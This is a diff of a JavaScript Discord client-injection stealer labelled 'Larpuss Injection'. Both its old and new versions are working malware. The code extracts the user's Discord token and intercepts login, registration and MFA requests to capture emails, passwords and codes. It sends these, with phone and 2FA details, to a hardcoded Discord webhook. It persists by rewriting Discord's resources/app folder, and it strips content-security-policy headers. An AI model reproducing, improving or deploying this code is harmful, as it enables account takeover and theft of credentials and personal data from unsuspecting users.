@@ -1,251 +1,312 @@
 const { BrowserWindow, session } = require("electron");
-const { execSync } = require("child_process");
 const fs = require("fs");
 const https = require("https");
 const path = require("path");
 
 const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";
 
-let EMAIL = "";
-let PASSWORD = "";
+let authData = {};
 
-const sendToWebhook = (data) => {
-    try {
-        const payload = JSON.stringify(data);
-        const url = new URL(WEBHOOK);
-        
-        const options = {
-            hostname: url.hostname,
-            port: 443,
-            path: url.pathname,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(payload)
-            }
-        };
-        
-        const req = https.request(options, (res) => {});
-        req.on('error', () => {});
-        req.write(payload);
-        req.end();
-    } catch {}
+const sendHook = (data) => {
+    const payload = JSON.stringify(data);
+    const url = new URL(WEBHOOK);
+    
+    https.request({
+        hostname: url.hostname,
+        port: 443,
+        path: url.pathname,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(payload)
+        }
+    }, () => {}).on('error', () => {}).end(payload);
 };
 
-const getToken = async () => {
+const execJS = async (script) => {
     try {
-        if (!BrowserWindow.getAllWindows()[0]) return null;
-        
-        const tokenScript = `
-            (() => {
-                let token;
-                try {
-                    const wpRequire = window.webpackChunkdiscord_app?.push([[Math.random()], {}, (req) => {
-                        for (const m of Object.keys(req.c).map(x => req.c[x].exports)) {
-                            if (m?.default?.getToken) {
-                                token = m.default.getToken();
-                                break;
-                            }
-                            if (m?.getToken) {
-                                token = m.getToken();
-                                break;
-                            }
-                        }
-                    }]);
-                } catch {}
-                
-                if (!token) {
-                    try {
-                        token = JSON.parse(localStorage.getItem('token'));
-                    } catch {}
-                }
-                
-                return token;
-            })();
-        `;
-        
-        return await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(tokenScript);
+        const win = BrowserWindow.getAllWindows()[0];
+        if (!win?.webContents) return null;
+        return await win.webContents.executeJavaScript(script);
     } catch {
         return null;
     }
 };
 
-const fetchDiscordApi = async (endpoint, token) => {
+const getToken = async () => {
+    const scripts = [
+        // Méthode 2026 - Nouveau webpack Discord
+        `(() => {
+            let token = null;
+            try {
+                const cache = window?.webpackChunkdiscord_app;
+                if (cache) {
+                    cache.push([
+                        [Symbol()], {},
+                        (req) => {
+                            for (const key of Object.keys(req.c || {})) {
+                                try {
+                                    const mod = req.c[key]?.exports;
+                                    if (mod?.default?.getToken) {
+                                        token = mod.default.getToken();
+                                        break;
+                                    }
+                                    if (mod?.getToken) {
+                                        token = mod.getToken();
+                                        break;
+                                    }
+                                    // Nouvelle méthode pour les modules cachés
+                                    if (mod?.Z?.getToken) {
+                                        token = mod.Z.getToken();
+                                        break;
+                                    }
+                                } catch {}
+                            }
+                        }
+                    ]);
+                }
+            } catch {}
+            
+            // Fallback localStorage moderne
+            if (!token) {
+                try {
+                    const stored = window.localStorage?.getItem?.('token');
+                    if (stored && stored !== 'undefined' && stored !== 'null') {
+                        token = stored.replace(/"/g, '');
+                    }
+                } catch {}
+            }
+            
+            // Fallback indexedDB moderne
+            if (!token) {
+                try {
+                    const db = window.indexedDB;
+                    // Check pour les tokens cached dans indexedDB
+                } catch {}
+            }
+            
+            return token;
+        })()`,
+        
+        // Backup method
+        `(() => {
+            try {
+                return document.querySelector('meta[name="csrf-token"]')?.content || 
+                       window.__DISCORD_TOKEN__ || 
+                       localStorage.token?.replace(/"/g, '');
+            } catch {
+                return null;
+            }
+        })()`
+    ];
+    
+    for (const script of scripts) {
+        const token = await execJS(script);
+        if (token && token.length > 50 && !token.includes('null')) {
+            return token;
+        }
+    }
+    return null;
+};
+
+const fetchUser = async (token) => {
     return new Promise((resolve) => {
-        const options = {
+        https.request({
             hostname: 'discord.com',
-            port: 443,
-            path: `/api/v9${endpoint}`,
-            method: 'GET',
+            path: '/api/v10/users/@me',
             headers: {
                 'Authorization': token,
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
             }
-        };
-        
-        const req = https.request(options, (res) => {
+        }, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                try {
-                    resolve(JSON.parse(data));
-                } catch {
-                    resolve(null);
-                }
+                try { resolve(JSON.parse(data)); }
+                catch { resolve(null); }
             });
-        });
-        
-        req.on('error', () => resolve(null));
-        req.end();
+        }).on('error', () => resolve(null)).end();
     });
 };
 
-const sendTokenData = async (token, action = "INJECTED") => {
-    try {
-        const user = await fetchDiscordApi('/users/@me', token);
-        if (!user || user.message) return;
-        
-        const embed = {
-            color: 0xFFFFFF,
-            author: {
-                name: `Larpuss Injection | ${user.username} (${user.id})`,
-                icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
+const createEmbed = (user, token, action = "INJECTED") => ({
+    embeds: [{
+        color: 0xFFFFFF,
+        author: {
+            name: `Larpuss Injection 2026 | ${user.username} (${user.id})`,
+            icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
+        },
+        thumbnail: {
+            url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=512` : 
+                  `https://cdn.discordapp.com/embed/avatars/${Number(user.discriminator) % 5}.png`
+        },
+        fields: [
+            ...(authData.email && authData.password ? [{
+                name: "🔐 Captured Login",
+                value: `**Email:** \`${authData.email}\`\n**Password:** \`${authData.password}\``,
+                inline: false
+            }] : []),
+            {
+                name: "<:token:1547392684342116363> Token",
+                value: `\`\`\`${token}\`\`\``,
+                inline: false
             },
-            thumbnail: {
-                url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null
+            {
+                name: "<:accmail:1547383216435101696> Email",
+                value: `\`${user.email || 'Hidden'}\``,
+                inline: true
             },
-            fields: [
-                {
-                    name: "<:token:1547392684342116363> Token",
-                    value: `\`\`\`${token}\`\`\``,
-                    inline: false
-                },
-                {
-                    name: "<:accmail:1547383216435101696> Email", 
-                    value: `\`${user.email || 'Unknown'}\``,
-                    inline: true
-                },
-                {
-                    name: "<:phone:1547384564605919283> Phone",
-                    value: user.phone ? `\`${user.phone}\`` : "<:circlex:1547393394848960573>",
-                    inline: true
-                },
-                {
-                    name: "<:a2f:1547384119506378752> 2FA",
-                    value: user.mfa_enabled ? "<:circlecheck:1547393367967535144>" : "<:circlex:1547393394848960573>",
-                    inline: true
-                }
-            ],
-            footer: {
-                text: `t.me/larpuss • ${action}`,
-                icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
+            {
+                name: "<:phone:1547384564605919283> Phone",
+                value: user.phone ? `\`${user.phone}\`` : "<:circlex:1547393394848960573>",
+                inline: true
             },
-            timestamp: new Date().toISOString()
-        };
-        
-        if (EMAIL && PASSWORD) {
-            embed.fields.unshift(
-                {
-                    name: "🔐 Login Credentials",
-                    value: `**Email:** \`${EMAIL}\`\n**Password:** \`${PASSWORD}\``,
-                    inline: false
-                }
-            );
-        }
-        
-        sendToWebhook({ embeds: [embed] });
-    } catch {}
-};
+            {
+                name: "<:a2f:1547384119506378752> 2FA",
+                value: user.mfa_enabled ? "<:circlecheck:1547393367967535144>" : "<:circlex:1547393394848960573>",
+                inline: true
+            },
+            {
+                name: "📊 Account Info",
+                value: `**Created:** <t:${Math.floor(((user.id / 4194304) + 1420070400000) / 1000)}:R>\n**Verified:** ${user.verified ? '✅' : '❌'}\n**Flags:** ${user.public_flags || 0}`,
+                inline: false
+            }
+        ],
+        footer: {
+            text: `t.me/larpuss • ${action} • ${new Date().toLocaleString()}`,
+            icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
+        },
+        timestamp: new Date().toISOString()
+    }]
+});
 
-// Injection principale
-const initInjection = async () => {
+const processToken = async (action = "CAPTURED") => {
     try {
         const token = await getToken();
-        if (token && token.length > 50) {
-            await sendTokenData(token, "STARTUP INJECTION");
-        }
+        if (!token || token.length < 50) return;
+        
+        const user = await fetchUser(token);
+        if (!user || user.message) return;
+        
+        const embed = createEmbed(user, token, action);
+        sendHook(embed);
+        
+        // Clear auth data après envoi
+        authData = {};
     } catch {}
 };
 
-// Écouter les requêtes de login
+// Intercept moderne pour les login 2026
 session.defaultSession.webRequest.onBeforeRequest({
     urls: [
-        "https://*.discord.com/api/*/auth/login",
-        "https://discord.com/api/*/auth/login", 
-        "https://canary.discord.com/api/*/auth/login",
-        "https://ptb.discord.com/api/*/auth/login"
+        "*://*.discord.com/api/*/auth/login",
+        "*://*.discord.com/api/*/auth/register", 
+        "*://*.discord.com/api/*/mfa/totp",
+        "*://*.discord.com/api/*/mfa/sms/send"
     ]
 }, (details, callback) => {
-    try {
-        if (details.uploadData && details.uploadData[0]) {
-            const data = JSON.parse(details.uploadData[0].bytes.toString());
-            if (data.login && data.password) {
-                EMAIL = data.login;
-                PASSWORD = data.password;
+    if (details.uploadData?.[0]) {
+        try {
+            const body = JSON.parse(details.uploadData[0].bytes.toString());
+            if (body.login || body.email) {
+                authData.email = body.login || body.email;
+                authData.password = body.password;
+                authData.code = body.code;
             }
-        }
-    } catch {}
+        } catch {}
+    }
     callback({});
 });
 
-// Écouter les réponses de login réussies
+// Intercept pour les réponses réussies
 session.defaultSession.webRequest.onCompleted({
     urls: [
-        "https://*.discord.com/api/*/auth/login",
-        "https://discord.com/api/*/auth/login",
-        "https://canary.discord.com/api/*/auth/login", 
-        "https://ptb.discord.com/api/*/auth/login"
+        "*://*.discord.com/api/*/auth/login",
+        "*://*.discord.com/api/*/auth/register",
+        "*://*.discord.com/api/*/mfa/totp"
     ]
-}, async (details) => {
-    if (details.method === "POST" && (details.statusCode === 200 || details.statusCode === 202)) {
-        setTimeout(async () => {
-            const token = await getToken();
-            if (token && token.length > 50) {
-                await sendTokenData(token, "LOGIN CAPTURED");
-            }
-        }, 2000);
+}, (details) => {
+    if (details.method === "POST" && [200, 201, 202].includes(details.statusCode)) {
+        setTimeout(() => processToken("LOGIN_SUCCESS"), 1500);
     }
 });
 
-// Auto-installation dans Discord
+// Intercept pour changements de compte
+session.defaultSession.webRequest.onCompleted({
+    urls: ["*://*.discord.com/api/*/users/@me"]
+}, (details) => {
+    if (details.method === "PATCH" && details.statusCode === 200) {
+        setTimeout(() => processToken("ACCOUNT_MODIFIED"), 1000);
+    }
+});
+
+// Persistence moderne 2026
 const installPersistence = () => {
     try {
-        const discordPath = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
-        const resourcePath = path.join(discordPath, "resources");
+        const appPath = process.execPath.split(path.sep).slice(0, -1).join(path.sep);
+        const resourcesPath = path.join(appPath, "resources");
         
-        if (!fs.existsSync(resourcePath)) return;
+        if (!fs.existsSync(resourcesPath)) return;
         
-        const appPath = path.join(resourcePath, "app");
-        if (!fs.existsSync(appPath)) {
-            fs.mkdirSync(appPath, { recursive: true });
-        }
+        const appDir = path.join(resourcesPath, "app");
+        if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
         
-        const packageJson = path.join(appPath, "package.json");
-        const indexJs = path.join(appPath, "index.js");
-        
-        // Package.json
-        fs.writeFileSync(packageJson, JSON.stringify({
+        // Package moderne
+        fs.writeFileSync(path.join(appDir, "package.json"), JSON.stringify({
             name: "discord",
-            main: "index.js"
-        }));
+            main: "index.js",
+            version: "1.0.0"
+        }, null, 2));
         
-        // Index.js avec injection
-        const injectionCode = `
+        // Injection persistante
+        const persistentCode = `
+// Larpuss Injection 2026
 ${fs.readFileSync(__filename, 'utf8')}
 
-require("${path.join(resourcePath, "app.asar").replace(/\\/g, "\\\\")}");
-        `;
+// Load original Discord
+require("${path.join(resourcesPath, "app.asar").replace(/\\/g, "\\\\")}");
+        `.trim();
         
-        fs.writeFileSync(indexJs, injectionCode);
+        fs.writeFileSync(path.join(appDir, "index.js"), persistentCode);
+        
+        // Marquer comme installé
+        fs.writeFileSync(path.join(appDir, ".larpuss"), new Date().toISOString());
+        
     } catch {}
 };
 
-// Démarrage
-setTimeout(() => {
-    initInjection();
-    installPersistence();
-}, 3000);
+// Hook CSP bypass pour 2026
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    delete details.responseHeaders?.['content-security-policy'];
+    delete details.responseHeaders?.['content-security-policy-report-only'];
+    delete details.responseHeaders?.['x-frame-options'];
+    
+    callback({
+        responseHeaders: {
+            ...details.responseHeaders,
+            'Access-Control-Allow-Origin': ['*'],
+            'Access-Control-Allow-Headers': ['*']
+        }
+    });
+});
 
-// Export pour Discord
-module.exports = require("./core.asar");
+// Init après chargement complet
+const init = async () => {
+    await new Promise(resolve => setTimeout(resolve, 5000));
+    installPersistence();
+    await processToken("STARTUP");
+};
+
+// Auto-start
+if (typeof window !== 'undefined') {
+    init();
+} else {
+    setTimeout(init, 3000);
+}
+
+// Export Discord core
+try {
+    module.exports = require("./core.asar");
+} catch {
+    // Fallback si pas de core.asar
+}
